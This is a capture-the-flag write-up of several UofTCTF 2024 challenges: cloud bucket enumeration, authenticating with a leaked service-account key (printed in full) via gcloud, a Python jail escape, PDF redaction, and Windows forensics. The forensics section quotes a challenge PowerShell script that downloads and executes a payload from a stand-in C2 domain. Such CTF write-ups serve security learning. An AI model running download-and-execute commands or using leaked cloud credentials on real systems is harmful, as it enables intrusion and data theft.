---
title: "[CTF] UofTCTF 2024"
date: 2024-01-26T20:14:12+07:00
draft: true
---

# UofTCTF 2024

## Introduction

###	General Information
> The flag format for all challenges is UofTCTF{...}, case insensitive. 
> If you are experiencing technical difficulties with challenges, support is on our Discord server: https://discord.gg/Un7avdkq7Z. 
> The flag for this challenge is UofTCTF{600d_1uck}.

FLAG: UofTCTF{600d_1uck}.

## IoT

### Baby's First IoT Introduction
> The following collections of challenges utilize the instructions provided below. 
> For each flag, there will be a challenge to submit it. 
> The flag format will NOT be UofTCTF{...}. The root IP is 35.225.17.48.
> Part 1 - Here is an FCC ID, Q87-WRT54GV81, what is the frequency in MHz for Channel 6 for that device? Submit the answer to port 3895.
> Part 2 - What company makes the processor for this device? https://fccid.io/Q87-WRT54GV81/Internal-Photos/Internal-Photos-861588. Submit the answer to port 6318.
> Part 3 - Submit the command used in U-Boot to look at the system variables to port 1337 as a GET request ex. 35.225.17.48:1337/{command}. This output is needed for another challenge. There is NO flag for this part.
> Part 4 – Submit the full command you would use in U-Boot to set the proper environment variable to a /bin/sh process upon boot to get the flag on the webserver at port 7777. Do not include the ‘bootcmd’ command. It will be in the format of "something something=${something} something=something" Submit the answer on port 9123.
> Part 5 - At http://35.225.17.48:1234/firmware1.bin you will find the firmware. Extract the contents, find the hidden back door in the file that is the first process to run on Linux, connect to the backdoor, submit the password to get the flag. Submit the password to port 4545.
> Part 6 - At http://35.225.17.48:7777/firmware2.bin you will find another firmware, submit the number of lines in the ‘ethertypes’ file multiplied by 74598 for the flag on port 8888.
> The flag for this introduction is {i_understand_the_mission}

FLAG: {i_understand_the_mission}

## Miscellaneous

### Out of the Bucket
> Check out my flag website!
>
> Author: windex
>
> https://storage.googleapis.com/out-of-the-bucket/src/index.html

In this challenge, we are given a URl contains a bucket. 

![img-chall](https://i.ibb.co/7pR8fsD/Screenshot-2024-01-15-164145.png)

Since the challenge is about bucket, I assume that it would be something about secret files or secret string inside the bucket or outside the bucket. Then, it would be something related to directory listing. Thus, I start accessing all directories by removing the last path like these URLs:
- https://storage.googleapis.com/out-of-the-bucket/src/index.html
- https://storage.googleapis.com/out-of-the-bucket/src/
- https://storage.googleapis.com/out-of-the-bucket/

In the third attempt which is the root directory gives us following bucket listing result:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<ListBucketResult
    xmlns="http://doc.s3.amazonaws.com/2006-03-01">
    <Name>out-of-the-bucket</Name>
    <Prefix/>
    <Marker/>
    <IsTruncated>false</IsTruncated>
    <Contents>
        <Key>secret/</Key>
        <Generation>1703868492595821</Generation>
        <MetaGeneration>1</MetaGeneration>
        <LastModified>2023-12-29T16:48:12.634Z</LastModified>
        <ETag>"d41d8cd98f00b204e9800998ecf8427e"</ETag>
        <Size>0</Size>
    </Contents>
    <Contents>
        <Key>secret/dont_show</Key>
        <Generation>1703868647771911</Generation>
        <MetaGeneration>1</MetaGeneration>
        <LastModified>2023-12-29T16:50:47.809Z</LastModified>
        <ETag>"737eb19c7265186a2fab89b5c9757049"</ETag>
        <Size>29</Size>
    </Contents>
    <Contents>
        <Key>secret/funny.json</Key>
        <Generation>1705174300570372</Generation>
        <MetaGeneration>1</MetaGeneration>
        <LastModified>2024-01-13T19:31:40.607Z</LastModified>
        <ETag>"d1987ade72e435073728c0b6947a7aee"</ETag>
        <Size>2369</Size>
    </Contents>
    <Contents>
        <Key>src/</Key>
        <Generation>1703867253127898</Generation>
        <MetaGeneration>1</MetaGeneration>
        <LastModified>2023-12-29T16:27:33.166Z</LastModified>
        <ETag>"d41d8cd98f00b204e9800998ecf8427e"</ETag>
        <Size>0</Size>
    </Contents>
    <Contents>
        <Key>src/index.html</Key>
        <Generation>1703867956175503</Generation>
        <MetaGeneration>1</MetaGeneration>
        <LastModified>2023-12-29T16:39:16.214Z</LastModified>
        <ETag>"dc63d7225477ead6f340f3057263643f"</ETag>
        <Size>1134</Size>
    </Contents>
    <Contents>
        <Key>src/static/antwerp.jpg</Key>
        <Generation>1703867372975107</Generation>
        <MetaGeneration>1</MetaGeneration>
        <LastModified>2023-12-29T16:29:33.022Z</LastModified>
        <ETag>"cef4e40eacdf7616f046cc44cc55affc"</ETag>
        <Size>45443</Size>
    </Contents>
    <Contents>
        <Key>src/static/guam.jpg</Key>
        <Generation>1703867372954729</Generation>
        <MetaGeneration>1</MetaGeneration>
        <LastModified>2023-12-29T16:29:32.993Z</LastModified>
        <ETag>"f6350c93168c2955ceee030ca01b8edd"</ETag>
        <Size>48805</Size>
    </Contents>
    <Contents>
        <Key>src/static/style.css</Key>
        <Generation>1703867372917610</Generation>
        <MetaGeneration>1</MetaGeneration>
        <LastModified>2023-12-29T16:29:32.972Z</LastModified>
        <ETag>"0c12d00cc93c2b64eb4cccb3d36df8fd"</ETag>
        <Size>76559</Size>
    </Contents>
</ListBucketResult>
```  
As we can see, there are lots of keys inside this bucket represent directories and files:
- secret/
- secret/dont_show
- secret/funny.json
- src
- src/index.html
- src/static/antwerp.jpg
- src/static/guam.jpg
- src/static/style.css

From those directories, the `secret` is the suspicious one. Then, by visiting the page we could download the `dont_show` file. Open the file and we get the flag.

FLAG: uoftctf{allUsers_is_not_safe}

### Out of the Bucket 2

> This is a continuation of "Out of the Bucket". Take a look around and see if you find anything!
>
> Author: windex

Based on previous resuls from Out of the Bucket challenge, we could see there is a `funny.json` file in the `secret` directory. It looks like this:
```json
{
    "type": "service_account",
    "project_id": "out-of-the-bucket",
    "private_key_id": "21e0c4c5ef71d9df424d40eed4042ffc2e0af224",
    "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDWxpWEDNiWgMzz\nxDDF64CspqiGPxkrHfhS4/PX8BrxNjUMPAH7vYHE3KbgQsmPhbCte9opnSLdMqec\nWjll8lRZGEy73xhWd2e3tVRAf53r+pW/p6MTOsz3leUkQAscG4hmOVOpGb1AkfuE\n62NErJVZIgQCowrBdFGbPxQc/IRQJKzrCFfKOWSHLvnngr4Ui5CSr6OM33dfpD+v\nQSLkEQheYCXmHwh/Wf8b27be+RzfOp/hOyjKsJOmDvFu2+rrx24t8hCptof3BYol\nUjpaiB8Qcct/HoKOEvZ/S5rW6toQizP8t4t7urC2i70JdH+Y4Qw/AZJNuLo/5wW1\n+x8i3FIDAgMBAAECggEABaGapVC06RVNdQ1tffL+d7MS8296GHWmX34B6bqDlP7S\nhenuNLczoiwVkAcQQ9wXKs/22Lp5rIpkd1FXn0MAT9RhnAIYdZlB4JY3iaK5oEin\nXn67Dt5Ze3BfBq6ghpx43L1KDUKogfs8jgVMoANVEyDfhrYsVQWDZ5T60QZp7bP2\n0zSDSACZpFzdf1vXzOhero8ykwM3keQiCIKWYkeMGsX8oHyWr1fz7AkU+pLciV67\nek10ItJUV70n2C65FgrW2Z1TpPKlpNEm8jQLSax9Bi89HuFEw8UjTfxKKzhLFXEu\nudtAyebt/PC4HS9FLBioo3bAy8vL3o00b7+raVyJQQKBgQD3IWaD5q5s7H0r10S/\n7IUhP1TDYhbLh7pupbzDGzu9wCFCMItwTEm9nYVNToKwV+YpeyoptEHQa4CAVp21\nO4+W7mBQgYemimjTtx1bIW8qzdQ9+ltQXyFAxj6m3KcuAsAzSpcHkbP46lCL5QoT\nTS6T06Fs4xvnTKtBdPeisSgiIwKBgQDee+mp5gsk8ynnp6fx0/liuO3AZxpTYcP8\nixaXLQI6CI4jQP2+P+FWNCTmEJxMaddXNOmmTaKu25S2H0KKMiQkQPuwBqskck3J\npVTHudnUuZAZWE7YPg40MJgg5OQhMVwiqGWL76FT2bubIdNm4LQyxvDeK82XQYl8\nszeOXfJeoQKBgGQqSoXdwwbtF5Lkbr4nnJIsPCvxHvIhskPUs1yVNjKjpBdS28GJ\nej37kaMS1k+pYOWhQSakJCTY3b2m3ccuO/Xd6nXW+mdbJD/jsWdVdtxvjr4MMmSy\nGiVJ9Ozm9G/mt4ZSjkKIIN0cA8ef7uSB3QYXug8LQi0O2z7trM1pZq3nAoGAMPhD\nOSMqRsrC6XtMivzmQmWD5zqKX9oAAmE26rV8bPufFYFjmHGFDq1RhdYYIPWW8Vnz\nJ6ik6ynntKJyyeo5bEVlYJxHJTGHj5+1ZnSwzpK9dearDAu0oqYjhfH7iJbNuc8o\n8sEe2E7vbTjnyBgjcZ26PJyVlvpU4b6stshU5aECgYEA7ZESXuaNV0Er3emHiAz4\noEStvFgzMDi8dILH+PtC3J2EnguVjMy2fceQHxQKP6/DCFlNqf9KUNqJBKVGxRWP\nIM1rcoAmf0sGQ5gl1B1K8PidhOi3dHF0nkYvivuMoj7sEyr9K88y69kdpVJ3J556\nJWqkWLCz8hx+LcQPfDJu0YE=\n-----END PRIVATE KEY-----\n",
    "client_email": "image-server@out-of-the-bucket.iam.gserviceaccount.com",
    "client_id": "102040203348783466577",
    "auth_uri": "https://accounts.google.com/o/oauth2/auth",
    "token_uri": "https://oauth2.googleapis.com/token",
    "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
    "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/image-server%40out-of-the-bucket.iam.gserviceaccount.com",
    "universe_domain": "googleapis.com"
}
```

By further investigation, this is a **service account key** in JSON format, which is typically used to authenticate a service account on Google Cloud Platform. Using this file, we can connect to a Google Cloud service using `gcloud-cli` tool. 

Before using this tool, we should install the Google Cloud SDK. Then, activate the service account with the service account key file. 
Use this command:

```
gcloud auth activate-service-account image-server@out-of-the-bucket.iam.gserviceaccount.com --key-file=file.json
gcloud config set project out-of-the-bucket
```
 
Now, we already authenticated to the service account and to list the buckets in the project we can run the `gcloud storage ls` command and we will see there are 2 buckets:

![buckets](https://i.ibb.co/rcWFWhS/image.png)

From those buckets, the `flag-images` is seems interesting. Now, we can copy or download all objects inside the `flag-images` to our local machine using this command:

`gsutil -m cp -r gs://flag-images .`

This command will copy an entire directory tree and [perform a parallel multi-threaded/multi-processing copy using the top-level gsutil -m option](https://cloud.google.com/storage/docs/gsutil/commands/cp) to our current directory.

![result-copy](https://i.ibb.co/7QNL6gR/image.png)

Opening each file, we can see the flag is located in the `xa.png`. 

![flag-oob-2](https://i.ibb.co/kXmrkQ3/image.png)

FLAG: uoftctf{s3rv1c3_4cc0un75_c4n_83_un54f3}

## Jail

### Baby's First Pyjail

> @windex told me that jails should be sourceless. So no source for you.
>
> Author: SteakEnthusiast
>
> nc 35.226.249.45 5000

In this challenge, I solved it using the solution from this [blog](https://www.cnblogs.com/mumuhhh/p/17811377.html). Use `breakpoint()` and spawn a shell to get the flag.

![jail](https://i.ibb.co/khhgwxk/Screenshot-2024-01-15-164407.png)

FLAG: uoftctf{you_got_out_of_jail_free}

## Forensics

### Secret Message 1

> We swiped a top-secret file from the vaults of a very secret organization, but all the juicy details are craftily concealed. Can you help me uncover them?
> 
> Author: SteakEnthusiast

We are given with a PDF file. The flag is hidden and covered by the black bar as you can see in this image below:

![pdf-img](https://i.ibb.co/ygwtx27/image.png)

I tried to highlight the black bar, and it revealed the flag.

![flag-s-m](https://i.ibb.co/xCHWDwG/image.png)

FLAG: uoftctf{fired_for_leaking_secrets_in_a_pdf}

### No grep

> Use the VM from Hourglass to find the 2nd flag on the system !
> 
> Author: 0x157

In order to solve this challenge, I already downloaded the VM from the Hourglass challenge. This challenge is still related to the previous challenge, Hourglass. Still in the same directory as the previous two files, I opened the file `update.ps1`.

It looked like this: 

![ps-script](https://i.ibb.co/6D766hS/Screenshot-2024-01-14-195049.png)

```powershell
$String_Key = 'W0wMadeitthisfar'

$NewValue = '$(' + (([int[]][char[]]$String | ForEach-Object { "[char]$($_)" }) -join '+') + ')'

$chars = 34, 95, 17, 57, 2, 16, 3, 18, 68, 16, 12, 54, 4, 82, 24, 45, 35, 0, 40, 63, 20, 10, 58, 25, 3, 65, 0, 20

$keyAscii = $String_Key.ToCharArray() | ForEach-Object { [int][char]$_ }

$resultArray = $chars -bxor $keyAscii

IEX (Invoke-WebRequest -Uri 'https://somec2attackerdomain.com/chrome.exe' -UseBasicParsing).Content
```

Based on the powershell script, it appears to set a key, perform a bitwise operation on ASCII representations, and then download and execute content from a specified URL.

From this we can easily decrypt it. I use CyberChef to do this and at the end of the operation we get a flag.

![flag-nogrep](https://i.ibb.co/gtkjwc7/image.png)

FLAG: uoftctf{0dd_w4y_t0_run_pw5h}

### Hourglass

> No EDR agent once again, we imaged this workstation for you to find the evil !
>
> Download Link : https://storage.googleapis.com/hourglass-uoftctf/ctf_vm.zip
>
> ( Updated Link, attachments remain the same, nothing was changed. )
>
> Author: 0x157

We are given with a Virtual Machine Image. I boot the VM and it's a Windows desktop.
I started the analysis by checking every common directory on this machine, such as:
- Documents
- Downloads
- Pictures
- Music
- Videos
After a while, I found no flags or information that contained clues other than `Readme` file and the fake flag file. Then I thought about the title of this challenge, Hourglass, and started looking for any files or directories related to "time" and "history". After a while, I found a directory called `History` in the following path:

`C:\Users\analyst\AppData\Local\Microsoft\Windows\History`

![img-history](https://i.ibb.co/Zc7QHq1/Screenshot-2024-01-14-194829.png)

After Googling it, it turned out to be the location on a Windows operating system where historical data relating to user activity and file access is stored. By accessing this directory, we can find something that I think could potentially be part of this snapshot system, representing different days when the snapshots were taken.

![date-file](https://i.ibb.co/6yyM3kR/Screenshot-2024-01-14-194850.png)

I then accessed each of them and in 'Friday' we can see the following contents:

![friday](https://i.ibb.co/Y7bqBSL/Screenshot-2024-01-14-195009.png)

There are two files that are quite interesting, which are
1. settings.txt
2. update.ps1

I assume that these two files are part of the flag or the flag itself. First, I opened `settings.txt`, which contained the following Base64 string:

![settings](https://i.ibb.co/fGCNL1p/Screenshot-2024-01-14-194943.png)

Then I decode it and get the following results: 

```
+--
 uoftctf{T4sK_Sch3Dul3r_FUN}
+--
```

FLAG: uoftctf{T4sK_Sch3Dul3r_FUN}


